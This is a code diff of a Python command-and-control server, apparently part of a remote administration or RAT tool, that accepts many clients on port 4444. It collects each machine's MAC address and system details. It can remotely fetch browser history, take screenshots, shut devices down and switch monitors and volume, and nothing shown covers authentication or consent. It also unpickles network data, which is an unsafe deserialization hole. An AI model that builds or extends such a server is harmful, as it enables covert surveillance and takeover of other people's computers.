@@ -2,13 +2,15 @@
 # TODO: check if connection is still maintained
 # TODO: add security via tokens and end-to-end encryption
 # TODO: Support multiple clients
+from threading import Thread
 import numpy as np
 import socket
-import pickle
 from datetime import datetime
 import time
 from PIL import Image
 import os
+import sys
+import pickle
 
 LOCATION = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
 
@@ -26,36 +28,23 @@ UNDERLINE = '\001\033[4m\002'
 END = '\001\033[0m\002'
 
 # LOG LEVELS
-INFO = f'{MAIN}Info{END}'
-WARNING = f'{LRED}Warning{END}'
-IMPORTANT = f'{ORANGE}Important{END}'
-FAIL = f'{RED}Fail{END}'
-DEBUG = f'{ORANGE}Debug{END}'
-SUCCESS = f'{GREEN}SUCCESS{END}'
+INFO = f'[{MAIN}Info{END}]'
+WARNING = f'[{LRED}Warning{END}]'
+IMPORTANT = f'[{ORANGE}Important{END}]'
+FAILING = f'[{RED}Fail{END}]'
+DEBUG = f'[{ORANGE}Debug{END}]'
+SUCCESS = f'[{GREEN}SUCCESS{END}]'
+
+HOST = socket.gethostbyname(socket.gethostname())
+PORT = 4444
+ADDR = (HOST, PORT)
+
+client_store = {}
 
 class CCA_SERVER:
     def __init__(self, host, port):
         self.host = host
         self.port = port
-
-    def start_connection(self):
-        global client, addr, sock
-        while True:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.bind((self.host, self.port))
-                sock.listen(5)
-                print(f"{INFO} Waiting for the client...")
-                client, addr = sock.accept()
-                ipcli = client.recv(1024).decode()
-                print(
-                    f"{SUCCESS} Connection is established successfully with {ipcli}"
-                )
-                break
-            except:
-                print(f"{WARNING} Host address already in use")
-                sock.close()
-            time.sleep(2)
 
     def banner(self):
         print(
@@ -70,6 +59,7 @@ ________/\\\\\\\\\________/\\\\\\\\\_____/\\\\\\\\\____
       __\///\\\___________\///\\\__________\/\\\_______\/\\\_  
        ____\////\\\\\\\\\____\////\\\\\\\\\_\/\\\_______\/\\\_ 
         _______\/////////________\/////////__\///________\///__
+                                             by HamzaDLM
 '''
             + END
             + '''
@@ -80,6 +70,7 @@ ________/\\\\\\\\\________/\\\\\\\\\_____/\\\\\\\\\____
     def list_commands(self):
         print(
             r'''
+
         List of commands:
 
         **** INFORMATION ****
@@ -97,67 +88,79 @@ ________/\\\\\\\\\________/\\\\\\\\\_____/\\\\\\\\\____
         - monoff      : TURN MONITOR OFF
         - monon       : TURN MONITOR ON
 
-        **** SETTINGS ****
         '''
         )
 
-    def result(self):
-        client.send(command.encode())
-        result_output = client.recv(1024).decode()
-        print(result_output)
+    def list_client_commands(self):
+        print(
+            r'''
 
-    def execute(self):
+        List of client specific commands:
+
+        **** INFORMATION ****
+        - help        : GET ALL AVAILABLE COMMANDS
+        - mac         : GET MACHINE'S MAC ADDRESS
+        - history     : GET BROWSER HISTORY (LAST 20)
+        - scrn        : GET SCREENSHOT OF CURRENT SESSION
+
+        **** CONTROL ****
+        - killc       : DISCONNECT CLIENT
+        - quit        : DISCONNECT SERVER
+        - shutdown    : SHUTDOWN THE CLIENT'S DEVICE
+        - voloff      : TURN VOLUME TO 0%
+        - volon       : TURN VOLUME TO 100%
+        - monoff      : TURN MONITOR OFF
+        - monon       : TURN MONITOR ON
+
+        '''
+        )
+
+    def execute_commands(self):
+        global current_client # all or id of client
+        current_client = None
         while True:
             global command
-            command = input('Command >> ')
 
-            if command == 'mac':
-                self.result()
-            
-            elif command == 'shutdown':
-                self.result()
-
-            elif command == 'volon':
-                self.result()
-
-            elif command == 'voloff':
-                self.result()
-
-            elif command == 'monon':
-                self.result()
-
-            elif command == 'monoff':
-                self.result()
-
-            elif command == 'help':
-                self.list_commands()
-
-            elif command == 'killc':
-                self.result()
-
-            elif command == 'quit':
-                print(f"{INFO} Terminating server connection!")
-                sock.close()
-                break
-
-            elif command == 'history':
-                client.send(command.encode())
-                result = client.recv(1024 * 10)
-                result = pickle.loads(result)
-                for h in result:
-                    print(f"{datetime.fromtimestamp(h)} : {result[h]}")
-
-            elif command == 'scrn':
-                client.send(command.encode())
-                self.receive_scrn()
+            if current_client:
+                command = input(f'> connected to {current_client} > ')
+                client_store[current_client]['commands'].append(command)
+                if current_client and 'quit' in command:
+                    current_client = None 
 
             else:
-                print(f"{WARNING}: {command} is not a valid command!")
+                command = input('> ')
+
+                if 'help' in command:
+                    self.list_commands()
+
+                elif 'list' in command:
+                    print(f'\n{"ID":<8} {"HOST":<15} {"PORT":<10} {"MAC":<20} {"SYSTEM":<20} {"Joined":<20}')
+                    if client_store:
+                        for k, v in client_store.items():
+                            addr = v['address']
+                            mac = v['mac']
+                            system = v['system']
+                            joined = v['joined']
+                            print(f"{k:<8} {addr[0]:<15} {addr[1]:<10} {mac:<20} {system:<20} {joined:<20}")
+                    else:
+                        print('\nNo devices connected to host')
+                        
+                elif 'connect' in command:
+                    parse = command.split(' ')
+                    current_client = parse[-1]
+
+                elif 'quit' in command:
+                    print(f'\n{INFO} Terminating server connection!')
+                    server_socket.close()
+                    break
+
+                else:
+                    print(f"\n{WARNING}: {command} is not a valid command!")
 
     def getTS(self):
         return str(int(time.time()))
 
-    def receive_scrn(self):
+    def receive_scrn(self, client):
         try:
             img_path = os.path.join(LOCATION, f'scrn/host__{self.getTS()}.npy')
             file = open(img_path, 'wb')
@@ -172,14 +175,108 @@ ________/\\\\\\\\\________/\\\\\\\\\_____/\\\\\\\\\____
             o_file = np.load(img_path)
             pil_img = Image.fromarray(np.uint8(o_file)).convert('RGB')
             pil_img.show()
-            print(f"{SUCCESS}: screenshot received")
+            print(f"\n{SUCCESS}: screenshot received")
         except:
-            print(f"{WARNING}: screenshot failed")
-            sock.close()
+            print(f"\n{WARNING}: screenshot failed")
+            server_socket.close()
+
+    def result(self, client):
+        client.send(command.encode())
+        result_output = client.recv(1024).decode()
+        print('\n' + result_output)
+
+    def handle_client(self, client_id):
+        print(f"\n{INFO} Connected to: {client_store[client_id]['address']}")
+        while True:
+            c = client_store[client_id]['commands']
+            s = client_store[client_id]['socket']
+            client_store[client_id]['mac'] = s.recv(1024).decode()
+            s.send(b'received')
+            client_store[client_id]['system'] = s.recv(1024).decode()
+            if len(c) > 0:
+                for com in c:
+                    if 'help' in com:
+                        self.list_client_commands()
+
+                    elif 'mac' in com:
+                        self.result(s)
+                    
+                    elif 'shutdown' in com:
+                        self.result(s)
+                    
+                    elif 'volon' in com:
+                        self.result(s)
+
+                    elif 'voloff' in com:
+                        self.result(s)
+
+                    elif 'monon' in com:
+                        self.result(s)
+                    
+                    elif 'monoff' in com:
+                        self.result(s)
+
+                    elif 'killc' in com:
+                        self.result(s)
+                    
+                    elif command == 'quit':
+                        print(f"\n{INFO} Terminating server connection!")
+                        s.close()
+                        break
+
+                    elif command == 'history':
+                        s.send(command.encode())
+                        result = s.recv(1024 * 10)
+                        result = pickle.loads(result)
+                        for h in result:
+                            print(f"\n{datetime.fromtimestamp(h)} : {result[h]}")
+
+                    elif command == 'scrn':
+                        s.send(command.encode())
+                        self.receive_scrn(s)
+
+                    else:
+                        print(f"\n{WARNING}: {command} is not a valid command!")
+                    
+                    c.remove(com)
+
+            time.sleep(0.1)
+
+    def main(self):
+        try:
+            global server_socket
+            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_socket.bind(ADDR)
+        except socket.error as err:
+            print(f'\n{FAILING}: Socket creation failed: {err}')
+            sys.exit()
+        server_socket.listen(20)
+        commands_thread = Thread(target=self.execute_commands)
+        commands_thread.start()
+        while True:
+            client_socket, client_address = server_socket.accept()
+            client_id = str(len(client_store)+1)
+            client_store[client_id] = {
+                'address': client_address,
+                'socket': client_socket,
+                'commands': [],
+                'mac': 'N/A',
+                'system': 'N/A',
+                'joined': self.getTS(),
+            }
+            client_thread = Thread(target=self.handle_client, args=(client_id,))
+            client_thread.start()
 
 
-if __name__ == '__main__':
-    server = CCA_SERVER('127.0.0.1', 4444)
-    server.banner()
-    server.start_connection()
-    server.execute()
+if __name__ == "__main__":
+    try:
+        server = CCA_SERVER(HOST, PORT)
+        server.banner()
+        server.main()
+    except KeyboardInterrupt:
+        # confirmation = input('Do you wish to terminate the session? [y/n]: ')
+        # selection = True if confirmation in ['y', 'yes'] else False
+        # if selection:
+        server_socket.close()
+        print(f'\n{INFO} Terminating session.')
+        sys.exit(0)
